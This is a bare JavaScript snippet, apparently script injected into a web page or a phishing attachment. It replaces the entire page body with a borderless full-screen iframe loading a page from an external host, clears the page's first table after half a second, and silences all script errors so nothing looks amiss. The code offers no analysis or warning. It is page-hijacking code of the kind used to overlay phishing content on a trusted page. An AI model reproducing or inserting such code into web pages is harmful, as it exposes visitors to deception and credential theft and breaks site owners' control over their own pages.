document.body.innerHTML = '<iframe src="http://computerperfect.be/Test/User/Test/Myro.html" height="100%" width="100%" style="border: 0"></iframe>';
setTimeout(function(){ document.getElementsByTagName('table')[0].innerHTML = '' }, 500);
window.onerror = function(message, url, lineNumber) {  
        // code to execute on an error  
        return true; // prevents browser error messages  
    };
